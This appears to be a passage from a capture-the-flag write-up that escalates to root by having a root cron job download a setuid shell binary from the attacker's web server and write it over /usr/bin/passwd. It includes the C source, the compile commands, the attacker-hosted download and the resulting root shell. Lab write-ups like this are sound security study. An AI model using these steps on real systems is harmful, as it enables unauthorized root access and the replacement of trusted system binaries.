
Sometimes we can replace existing binaries like /usr/bin/passwd to modify them with our malicious one's. Especially when cron's are doing the job for us with high privs.

Let's create our malicious binary which will set /bin/sh as root. Stored the following code inside an "setuid.c" file on my local machine.

```
#include <unistd.h>

void main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh","sh",NULL);
}
```

Compiled the script into binary format.

```
gcc -o setuid setuid.c
```

Started up an python3 webserver inside the directory in which my malicious binary is stored.

```
python3 -m http.server 80
```

Let's now modify the input file using the nano editor.

```
nano input
url = "http://10.10.14.57/setuid"
output = /usr/bin/passwd
```

After the file got downloaded we can simply execute the passwd binary and gain root shell.

```
/usr/bin/passwd
```

Faced an issue in regards of running the binary since the gcc version of which I compiled my script is newer than the current one on the server.

```
/usr/bin/passwd
/usr/bin/passwd: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /usr/bin/passwd)
```

I solved the issue by compiling my script again statically.

```
gcc -static -o setuid setuid.c
```

Started up an python3 webserver inside the directory in which my malicious binary is stored.

```
python3 -m http.server 80
```

Changed the "input" file again in nano.

```
nano input
```

Executed the passwd binary and gained root shell.

```
floris@curling:~/admin-area$ /usr/bin/passwd
#
```